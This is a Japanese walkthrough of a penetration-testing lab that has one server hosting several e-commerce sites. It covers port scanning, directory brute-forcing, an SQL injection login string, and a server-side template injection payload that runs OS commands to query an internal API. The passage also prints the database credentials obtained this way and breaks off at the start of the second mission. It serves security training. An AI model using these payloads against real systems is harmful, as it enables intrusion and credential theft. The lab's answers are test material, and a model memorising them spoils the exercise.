tags:
- ペネトレーションテスト

ペネトレーションテスターのあなたは、「出店するECサイトのWebサーバを構築したが、セキュリティ面で安全に構築できたか不安だ。サーバを攻撃者目線で確認してサーバの管理者権限が取得できるかテストして欲しい」という依頼を受けました。

以下の質問に答えながら、Storeサーバを調査し、サーバの管理者権限が取得できるかテストを行ってください。なお、今回のサーバは1つのサーバで複数のWebサイトが立ち上がっています。

## ミッション 1情報収集

外部からアクセスできるアプリケーションを列挙し、脆弱性や設定ミスを見つけてください 

10.234.132.70

### タスク 1

ポートスキャン

対象のサーバにポートスキャンを実行します。1-10000番のTCPポートへスキャンを行い、開放されているポートの数を解答してください。

```
┌──(kali㉿kali)-[~]
└─$ nmap -sT -p 1-10000 10.234.132.22
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-08 13:47 JST
Nmap scan report for ip-10-234-132-22.ap-northeast-1.compute.internal (10.234.132.22)
Host is up (0.00028s latency).
Not shown: 9996 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8000/tcp open  http-alt
8080/tcp open  http-proxy
MAC Address: 0A:4D:BC:E9:5B:61 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.70 seconds
                                                                        
┌──(kali㉿kali)-[~]
└─$ 
```

解説

ポートスキャンを実行することで、外部からアクセスできるポートを特定し、そのポートで動作しているアプリケーションの調査を行っていきます。

```
┌──(kali㉿kali)-[~]
└─$ nmap -p 1-10000 -Pn <target1_ip>
Starting Nmap 7.94 ( https://nmap.org ) at 2024-04-05 10:23 JST
Nmap scan report for ip-<target1_ip>.ap-northeast-1.compute.internal (<target1_ip>)
Host is up (0.0053s latency).
Not shown: 9996 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8000/tcp open  http-alt
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 1.20 seconds
```

SSHサーバやWebサーバが使用するポートの開放が確認でき、計4つのポートの開放が確認できます。

よって、タスク1の答えは、4となります。

### タスク 2

Webページの調査

タスク1の結果からサーバ管理者が独自に作成したと思われるWebサイトがいくつか確認できます。それらの管理者のログイン画面では、パスの第一階層で同じワードが利用されています。そのワードを解答してください

ディレクトリ・ファイル探索 (Brute Forcing)

```
┌──(kali㉿kali)-[~]
└─$ ffuf -u http://10.234.132.22:8000/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.234.132.22:8000/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

:: Progress: [40/4715] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Progress: [85/4715] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Progress: [132/4715] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00]:: Progress: [193/4715] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00]:: Progress: [247/4715] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00]:: Progress: [294/4715] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00]:: Progress: [347/4715] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00]:: Progress: [386/4715] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00]:: Progress: [433/4715] :: Job [1/1] :: 346 req/sec :: Duration: [0:00:0:: Progress: [487/4715] :: Job [1/1] :: 365 req/sec :: Duration: [0:00:0:: Progress: [543/4715] :: Job [1/1] :: 380 req/sec :: Duration: [0:00:0[Status: 200, Size: 1083, Words: 163, Lines: 31, Duration: 95ms]
    * FUZZ: admin

:: Progress: [562/4715] :: Job [1/1] :: 381 req/sec :: Duration: [0:00:0:: Progress: [594/4715] :: Job [1/1] :: 413 req/sec :: Duration: [0:00:0:: Progress: [637/4715] :: Job [1/1] :: 403 req/sec :: Duration: [0:00:0:: Progress: [679/4715] :: Job [1/1] :: 390 req/sec :: Duration: [0:00:0:: Progress: [732/4715] :: Job [1/1] :: 387 req/sec :: Duration: [0:00:0:: Progress: [784/4715] :: Job [1/1] :: 375 req/sec :: Duration: [0:00:0:: Progress: [831/4715] :: Job [1/1] :: 383 req/sec :: Duration: [0:00:0:: Progress: [4667/4715] :: Job [1/1] :: 417 req/sec :: Duration: [0:00::: Progress: [4715/4715] :: Job [1/1] :: 419 req/sec :: Duration: [0:00::: Progress: [4715/4715] :: Job [1/1] :: 424 req/sec :: Duration: [0:00:11] :: Errors: 0 ::
                                                                        
┌──(kali㉿kali)-[~]
└─$ 

```
解説

タスク1の結果から各ポートにWebブラウザでアクセスすると、3つのWebサイトの動作が確認できます。

このうち、8080ではphpmyadminと呼ばれるOSSで実装されている管理用のWebサイトが動作しています。

一方で、80と8000番ポートでは、サーバの管理者によって作成されたと思われるショッピングサイトの動作が確認できます。

そこで、これらのWebサイトにディレクトリブルートフォースを行い、アクセスできるディレクトリやファイル等のエンドポイントを列挙します。

```
┌──(kali㉿kali)-[~]
└─$ feroxbuster --url http://<target1_ip>:<target1_port>/ -w /usr/share/wordlists/dirb/common.txt
```

実行の結果、次のような出力が得られます。

```
...(snip)...

404      GET        1l        3w       16c http://<target1_ip>/admin.php
302      GET       12l       22w      358c http://<target1_ip>/admin/ => http://<target1_ip>/admin/login
200      GET       47l      118w     2135c http://<target1_ip>/admin/login
302      GET       12l       22w      358c http://<target1_ip>/admin => http://<target1_ip>/admin/login

...(snip)...

[####################] - 5m     27740/27740   0s      found:60      errors:1
[####################] - 3m      4614/4614    30/s    http://<target1_ip>/
[####################] - 3m      4614/4614    26/s    http://<target1_ip>/build/
[####################] - 3m      4614/4614    25/s    http://<target1_ip>/build/assets/
[####################] - 3m      4614/4614    26/s    http://<target1_ip>/index.php/
[####################] - 2m      4614/4614    36/s    http://<target1_ip>/storage/
[####################] - 52s     4614/4614    89/s    http://<target1_ip>/storage/upload/

...(snip)...

200      GET       71l      143w     3033c http://<target1_ip>:8000/
200      GET       31l       71w     1070c http://<target1_ip>:8000/admin/menu
200      GET       31l       77w     1083c http://<target1_ip>:8000/admin
[####################] - 7s      4625/4625    0s      found:8       errors:1
[####################] - 6s      4614/4614    742/s   http://<target1_ip>:8000/
```

双方の出力結果を確認すると、/adminという管理者用のパス文字列が確認できます。そこでWebブラウザから/adminにアクセスすると、どちらもログイン画面の表示が確認できます。

ただし、80番ポートで動作しているWebサイトは、出力からも確認できるように/admin/loginにリダイレクトされていることがわかります。

これは、認証情報をリクエストに付与せず、認証情報(セッションID等)が必要なページにアクセスしたため、ログインページにリダイレクトされたと考えることができます。

よって、タスク2の答えは、adminとなります。

### タスク 3

認証不備

タスク2で確認したログインページには認証不備があるようです。その不備を利用しアクセスできるログイン後のダッシュボードと思われるページのパスを解答してください。

SQLi
admin08043366033.com
' OR 1=1 --

解説

タスク2の結果を再度注目すると、80番ポートで動作するWebサイトの管理ページにアクセスした際には、適切にリダイレクトされることを確認しました。

一方で、8000番ポートで動作するWebサイトでは、リダイレクトが発生しておらす、/admin/menuというパスに直接アクセスできていることがわかります。

そこで、このパスに直接アクセスすると、ようこそ管理画面へという文字列が表示されることがわかります。この文字列から、この画面はログイン後にリダイレクトされるダッシュボード用のページと推測できます。

よって、タスク3の答えは、/admin/menuとなります。

### タスク 4

内部APIの確認
正解

管理者のログイン後のページにアクセスした後、内部APIのについて記載されているページがあります。内部APIはリクエストをどのポート番号で受け付けるかを解答してください。

解説

管理者ページを探索し、/admin/menuのリンクを辿ると/admin/syncというページがあります。そこでは、ローカルで動いている商品規格同期APIの使い方が記載されています。

また、記載されているURLを確認するとhttp://localhost:8010と書かれており、内部APIは8010番ポートで動作していることがわかります。

よって、タスク4の答えは、8010となります。

### タスク 5

内部APIの実行

タスク4で確認した内部APIを、とある脆弱性を利用して実行してください。その結果から開発用のAPIの存在が確認できます。そのAPIのパス文字列を解答してください。

タスク4では、内部APIの存在を確認しました。この内部APIにアクセスできれば、サーバ内部からのみ閲覧できる情報が取得できそうです。そこで、内部APIにアクセスするために何らかの方法や脆弱性がないかを確認します。

http://<target1_ip>:8000/ にアクセスし製品タブをクリックすると、http://<target1_ip>:8000/?page=products.htmlにアクセスします。これより、pageパラメータにproducts.htmlを渡していることが分かります。

ここでpageパラメータの値を適当な文字列aaaにして送信すると、受け取った文字列をそのまま表示していることが分かります。

パラメータの値を表示するだけではなく、特定の記法が含まれていることを確認し、これに応じて処理をするというような仕組みがある場合、別の処理を実行できる可能性があります。

この典型的な例としては、テンプレートエンジンが解釈する記法があります。そこで、pageパラメータの値を{{ 100 * 10 }}という文字列にすると、1000と返ってきます。

よって、内部のテンプレートエンジンによって評価が行われ、計算処理が行われたことが分かります。

つまり、任意のテンプレートを挿入できるサーバーサイド・テンプレート・インジェクション(Server-Side Template Injection:SSTI)脆弱性があることが分かります。

SSTI脆弱性が存在する場合、任意のコードが実行できるためリバースシェルを取得することを考えます。しかし、このサーバはファイアウォールによってアウトバウンドへの通信が制限されているようです。

そこで、逐次コマンドを実行しながらサーバ内を探索することにします。

SSTI脆弱性を使って商品規格同期APIを実行してみましょう。そこで、/api/health を下記のパラメータで実行してみます。

http://<target1_ip>:8000/?page={{%20request.application.__globals__.__builtins__.__import__(%27os%27).popen(%27curl%20http://localhost:8010/api/health%27).read()%20}}
すると、以下の値が帰ってきます。

{"debug":"/api/debug","sync master":"/api/sync/master","sync slave":"/api/sync/slave"} 
よって、タスク5の答えは、/api/debugとなります。

### タスク６

これはデバッグ用のAPIと思われるので、有益な情報が得られるかもしれません。そこで、/api/debug を下記のパラメータで実行してみます。

http://<target1_ip>:8000/?page={{%20request.application.__globals__.__builtins__.__import__(%27os%27).popen(%27curl%20http://localhost:8010/api/debug%27).read()%20}}
すると、MariaDB(MySQL)のユーザ情報とパスワードを取得することができました。

{"MASTER_DB":"mysql","MASTER_DB_PASSWORD":"frontier-facile-harbor-dock-indolent","MASTER_DB_USER":"phpmyadmin","SLAVE_DB":"sqlite"}
よって、タスク6の答えは、phpmyadmin:frontier-facile-harbor-dock-indolentとなります。




ミッション 2
一般ユーザ権限の取得


